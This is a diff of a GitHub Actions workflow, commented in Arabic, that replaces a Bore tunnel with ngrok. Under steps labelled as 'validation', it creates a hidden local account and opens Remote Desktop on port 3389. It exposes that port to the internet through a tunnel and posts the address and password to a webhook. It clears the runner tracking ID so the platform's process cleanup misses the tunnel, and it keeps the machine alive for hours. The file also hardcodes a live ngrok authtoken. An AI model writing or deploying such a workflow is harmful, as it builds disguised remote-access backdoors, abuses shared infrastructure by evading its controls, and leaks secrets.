@@ -8,7 +8,7 @@ on:
 jobs:
   build-test:
     runs-on: windows-2022
-    timeout-minutes: 350   # 5.5 ساعات (330 دقيقة) + هامش
+    timeout-minutes: 330  # 5.5 ساعات
 
     steps:
       - name: Checkout repository
@@ -58,8 +58,7 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      # ---- الخطوة الأولى المعدلة: Bore بدلاً من Ngrok ----
-      - name: Start Background Validation Service (Bore TCP Tunnel)
+      - name: Start Background Validation Service (ngrok TCP - Fixed)
         run: |
           $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
@@ -76,47 +75,71 @@ jobs:
           netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
           Restart-Service TermService -Force -ErrorAction SilentlyContinue
 
-          # === تحميل وتشغيل Bore (الأفضل لـ TCP في CI) ===
-          $boreUrl = "https://github.com/ekzhang/bore/releases/latest/download/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
-          $zip = "$env:TEMP\bore.zip"
-          $extractPath = "$env:TEMP\bore"
+          # === ngrok Setup (النسخة المحسنة 100%) ===
+          $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
+          $zip = "$env:TEMP\ngrok.zip"
+          $extractPath = "$env:TEMP\ngrok_folder"
           
-          Invoke-WebRequest -Uri $boreUrl -OutFile $zip
+          Invoke-WebRequest -Uri $ngrokUrl -OutFile $zip
           Expand-Archive $zip -DestinationPath $extractPath -Force
-          $boreExe = "$extractPath\bore.exe"
+          $exe = "$extractPath\ngrok.exe"
 
-          $log = "$env:TEMP\bore.log"
+          $log = "$env:TEMP\ngrok.log"
+          $errLog = "$env:TEMP\ngrok_err.log"
 
-          Write-Host "Starting Bore TCP tunnel..."
-          Start-Process -FilePath $boreExe -ArgumentList "local 3389 --to bore.pub" `
-            -RedirectStandardOutput $log -WindowStyle Hidden
+          $ngrokToken = "3AhpPhQAVlnYjyKahRKtc1p28gI_66SuDQdWYPGFs7orWLzrn"
+          & $exe config add-authtoken $ngrokToken
 
-          Start-Sleep -Seconds 18
+          # الحل الأساسي: فصل العملية عن GitHub Tracker
+          $env:RUNNER_TRACKING_ID = $null
 
+          Write-Host "Starting ngrok TCP tunnel with full detachment..."
+          $psi = New-Object System.Diagnostics.ProcessStartInfo
+          $psi.FileName = $exe
+          $psi.Arguments = "tcp 3389 --log=stdout --log-level=debug"
+          $psi.UseShellExecute = $false
+          $psi.RedirectStandardOutput = $true
+          $psi.RedirectStandardError = $true
+          $psi.WindowStyle = 'Hidden'
+          $psi.CreateNoWindow = $true
+
+          $process = [System.Diagnostics.Process]::Start($psi)
+          $pid = $process.Id
+          $pid | Out-File "$env:TEMP\ngrok.pid" -Force
+
+          Start-Sleep -Seconds 25
+
+          # استخراج الرابط (log + API محلي)
           $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue
+          $errData = Get-Content $errLog -Raw -ErrorAction SilentlyContinue
 
-          $target = $null
-          if ($logData -match 'Listening on (bore\.pub:\d+)') {
-              $target = $Matches[1]
-          } elseif ($logData -match '(bore\.pub:\d+)') {
-              $target = $Matches[1]
+          $url = $null
+          if ($logData -match 'url=(tcp://[^\s]+)') { $url = $Matches[1] }
+
+          if (-not $url) {
+              try {
+                  $api = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -Method Get -ErrorAction Stop
+                  $tunnel = $api.tunnels | Where-Object { $_.proto -eq "tcp" } | Select-Object -First 1
+                  if ($tunnel) { $url = $tunnel.public_url }
+              } catch { Write-Host "API not ready yet" }
           }
 
-          if ($target) {
-              $msg = "Target: tcp://$target`nU: $usr`nP: $pwd`nTool: Bore"
-              Write-Host "✅ Bore tunnel created successfully: tcp://$target"
+          if ($url) {
+              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (detached)"
+              Write-Host "✅ ngrok tunnel created successfully - PID: $pid"
           } else {
-              $msg = "Bore Init failed:`n$logData"
+              $msg = "Init failed (check logs below)`nLog: $($logData | Select-Object -Last 30)`nErr: $($errData | Select-Object -Last 30)"
           }
 
           $body = @{ content = $msg } | ConvertTo-Json
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
 
-          # طباعة اللوج للتشخيص في GitHub Actions
-          Write-Host "`n--- Bore Log (last 15 lines) ---"
-          Get-Content $log -Tail 15 -ErrorAction SilentlyContinue | Write-Host
+          # طباعة اللوج الكامل للتشخيص
+          Write-Host "`n--- ngrok Log (last 30 lines) ---"
+          Get-Content $log -Tail 30 -ErrorAction SilentlyContinue | Write-Host
+          Write-Host "`n--- ngrok Error Log ---"
+          Get-Content $errLog -Tail 20 -ErrorAction SilentlyContinue | Write-Host
 
-      # ---- خطوة التشخيص (تم تعديل فحص العملية) ----
       - name: Run Diagnostics
         run: |
           $rep = "SysDiag:`n"
@@ -134,47 +157,46 @@ jobs:
           $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
           if ($fw) { $rep += "FW: OK`n" } else { $rep += "FW: ERR`n" }
 
-          # الفحص عن عملية bore
-          $np = Get-Process bore -ErrorAction SilentlyContinue
-          if ($np) { $rep += "PRC: OK ($($np.Id))`n" } else { $rep += "PRC: ERR`n" }
+          # فحص ngrok (عملية + ملف PID)
+          $np = Get-Process ngrok -ErrorAction SilentlyContinue
+          if (-not $np -and (Test-Path "$env:TEMP\ngrok.pid")) {
+              $savedPid = Get-Content "$env:TEMP\ngrok.pid" -Raw
+              $np = Get-Process -Id $savedPid -ErrorAction SilentlyContinue
+          }
+          if ($np) { $rep += "PRC: OK (PID $($np.Id))`n" } else { $rep += "PRC: ERR`n" }
 
           $body = @{ content = $rep } | ConvertTo-Json -Depth 10
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
         continue-on-error: true
 
-      # ---- خطوة المراقبة الطويلة (معدلة إلى 5.5 ساعات) ----
-      - name: Run Extended Validation (with bore monitoring)
+      - name: Run Extended Validation (with ngrok monitoring)
         run: |
-          # دالة لإعادة تشغيل bore إذا توقف
-          function Restart-Bore {
-            $boreExe = "$env:TEMP\bore\bore.exe"
-            if (-not (Test-Path $boreExe)) {
-              $boreUrl = "https://github.com/ekzhang/bore/releases/latest/download/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
-              $zip = "$env:TEMP\bore.zip"
-              Invoke-WebRequest -Uri $boreUrl -OutFile $zip
-              Expand-Archive $zip -DestinationPath "$env:TEMP\bore" -Force
-            }
-            Start-Process -FilePath $boreExe -ArgumentList "local 3389 --to bore.pub" `
-              -RedirectStandardOutput "$env:TEMP\bore.log" -WindowStyle Hidden
-            Start-Sleep -Seconds 10
-            return Get-Process bore -ErrorAction SilentlyContinue
+          # دالة لإعادة تشغيل ngrok إذا توقف (باستخدام detachment)
+          function Restart-Ngrok {
+            $exe = "$env:TEMP\ngrok_folder\ngrok.exe"
+            $env:RUNNER_TRACKING_ID = $null
+            & $exe config add-authtoken "3AhpPhQAVlnYjyKahRKtc1p28gI_66SuDQdWYPGFs7orWLzrn" > $null 2>&1
+            Start-Process -FilePath $exe -ArgumentList "tcp 3389 --log=stdout --log-level=debug" `
+              -RedirectStandardOutput "$env:TEMP\ngrok.log" -WindowStyle Hidden
+            Start-Sleep -Seconds 15
+            return Get-Process ngrok -ErrorAction SilentlyContinue
           }
 
           $restartCount = 0
           $maxRestarts = 10
-          $endTime = (Get-Date).AddMinutes(330)   # 5.5 ساعات = 330 دقيقة
+          $endTime = (Get-Date).AddMinutes(330)  # 5.5 ساعات
 
           while ((Get-Date) -lt $endTime -and $restartCount -lt $maxRestarts) {
-            # 1. التحقق من وجود عملية bore
-            $bore = Get-Process bore -ErrorAction SilentlyContinue
-            if (-not $bore) {
-              Write-Host "bore not running. Restarting... Attempt $($restartCount+1)"
-              $bore = Restart-Bore
-              if ($bore) {
+            # 1. التحقق من وجود عملية ngrok
+            $ng = Get-Process ngrok -ErrorAction SilentlyContinue
+            if (-not $ng) {
+              Write-Host "ngrok not running. Restarting... Attempt $($restartCount+1)"
+              $ng = Restart-Ngrok
+              if ($ng) {
                 $restartCount++
-                Write-Host "bore restarted successfully."
+                Write-Host "ngrok restarted successfully."
               } else {
-                Write-Host "Failed to restart bore."
+                Write-Host "Failed to restart ngrok."
               }
             }
 
@@ -191,13 +213,13 @@ jobs:
             Start-Sleep -Seconds 900
           }
 
-          # إيقاف bore في النهاية
-          Get-Process bore -ErrorAction SilentlyContinue | Stop-Process -Force
+          # إيقاف ngrok في النهاية
+          Get-Process ngrok -ErrorAction SilentlyContinue | Stop-Process -Force
           Write-Host "Extended validation completed. Total restarts: $restartCount"
 
       - name: Cleanup Environment
         run: |
-          Get-Process -Name "bore" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Get-Process -Name "ngrok" -ErrorAction SilentlyContinue | Stop-Process -Force
         continue-on-error: true
 
       - name: Finalize Check
